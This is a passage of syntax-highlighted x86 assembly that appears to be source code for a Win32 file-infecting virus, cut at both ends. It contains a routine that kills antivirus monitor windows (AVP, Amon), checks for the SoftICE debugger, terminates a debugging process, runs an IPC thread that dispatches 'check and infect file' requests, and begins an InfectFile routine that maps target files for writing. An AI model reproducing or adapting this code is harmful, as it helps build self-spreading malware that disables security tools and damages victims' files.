    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">common_stage</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldGetLastError</span><span class="sc0">


</span><span class="sc5">Monitor</span><span class="sc4">:</span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">szU32</span><span class="sc0">              </span><span class="sc1">;push address of string USER32.dll</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'USER32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szU32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddLoadLibraryA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">;Load USER32.dll</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_mon2</span><span class="sc0">             </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindWindowA</span><span class="sc0">            </span><span class="sc1">;push address of string FindWindowA</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindWindowA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindWindowA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;push lib handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;get address of FindWindowA API</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_mon</span><span class="sc0">              </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc0">           </span><span class="sc1">;push address of string PostMessageA</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'PostMessageA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PostMessageA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get address of PostMessageA</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_mon</span><span class="sc0">              </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">              </span><span class="sc1">;number of monitors</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Monitors</span><span class="sc0">               </span><span class="sc1">;push address of strings</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'AVP Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;AVP monitor</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Amon Antivirus Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;AMON english version</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'AntivÌrusov˝ monitor Amon'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;AMON slovak version</span><span class="sc0">
</span><span class="sc5">Monitors</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;pop address</span><span class="sc0">
</span><span class="sc5">k_mon</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;find window</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_mon</span><span class="sc0">             </span><span class="sc1">;quit if not found</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                </span><span class="sc1">;WM_QUIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;destroy window</span><span class="sc0">
</span><span class="sc5">next_mon</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">                  </span><span class="sc1">;get to next string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;move it to EDX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">k_mon</span><span class="sc0">              </span><span class="sc1">;try another monitor</span><span class="sc0">

</span><span class="sc5">end_mon</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;push lib handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddFreeLibrary</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;unload library</span><span class="sc0">
</span><span class="sc5">end_mon2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">d_wr</span><span class="sc0">                </span><span class="sc1">;and quit</span><span class="sc0">


</span><span class="sc5">Debug2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sice95</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;address of softice driver string</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_driver</span><span class="sc0">            </span><span class="sc1">;open driver</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;is EAX==0?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_sice</span><span class="sc0">                       </span><span class="sc1">;yeah, SoftICE is not present</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_driver</span><span class="sc0">           </span><span class="sc1">;close driver</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">d_wr</span><span class="sc0">                </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">n_sice</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">siceNT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;address of softice driver string</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_driver</span><span class="sc0">            </span><span class="sc1">;open driver</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n2_db</span><span class="sc0">                </span><span class="sc1">;quit if not present</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_driver</span><span class="sc0">           </span><span class="sc1">;close driver</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">d_wr</span><span class="sc0">                </span><span class="sc1">;and quit</span><span class="sc0">


</span><span class="sc5">Debug1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szAlternateFileName</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;push ID number of process</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddOpenProcess</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;open process</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n1_db</span><span class="sc0">
</span><span class="sc5">n2_db</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">t_write</span><span class="sc0">                </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m_thrd</span><span class="sc0">
</span><span class="sc5">n1_db</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddTerminateProcess</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">;destroy debugged process :)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">t_write</span><span class="sc0">

</span><span class="sc5">mThread</span><span class="sc4">:</span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;main IPC thread</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_mThread</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gtDelta</span><span class="sc0">                </span><span class="sc1">;get delta</span><span class="sc0">

</span><span class="sc5">m_thrd</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;get thread ID number</span><span class="sc0">
</span><span class="sc5">t_number</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_WaitGet</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_set_VLCB</span><span class="sc0">           </span><span class="sc1">;wait for request</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">              </span><span class="sc1">;quit</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">Check</span><span class="sc0">             </span><span class="sc1">;check file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">               </span><span class="sc1">;check and infect file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Debug1</span><span class="sc0">               </span><span class="sc1">;check for debugger</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Debug2</span><span class="sc0">               </span><span class="sc1">;check for SoftICE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Monitor</span><span class="sc0">              </span><span class="sc1">;kill AV monitors</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSleep</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;switch to next thread</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m_thrd</span><span class="sc0">              </span><span class="sc1">;and again...</span><span class="sc0">

</span><span class="sc5">Quit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">t_write</span><span class="sc0">                </span><span class="sc1">;write result</span><span class="sc0">
</span><span class="sc5">end_mThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit from thread</span><span class="sc0">
</span><span class="sc5">t_write</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;set result</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">t_wr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szAlternateFileName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;write it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_SetWait</span><span class="sc0">           </span><span class="sc1">;set and wait</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">t_number</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;this thread</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_set_VLCB</span><span class="sc0">           </span><span class="sc1">;IPC!</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Check</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">err_sCheck</span><span class="sc4">&gt;</span><span class="sc0">    </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckFile</span><span class="sc0">              </span><span class="sc1">;check file</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">err_sCheck</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">
</span><span class="sc5">_c1_ok</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">t_write</span><span class="sc0">                </span><span class="sc1">;write result</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m_thrd</span><span class="sc0">              </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">err_sCheck</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
</span><span class="sc5">d_wr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">t_wr</span><span class="sc0">               </span><span class="sc1">;write result</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m_thrd</span><span class="sc0">              </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_c1_ok</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">             </span><span class="sc1">;check and infect file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_c1_ok</span><span class="sc0">              </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get filename</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddCreateFileA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">r_attr</span><span class="sc0">               </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;save handle</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddCreateFileMappingA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;create file mapping</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">endCreateMapping</span><span class="sc0">          </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMapFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;save handle</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
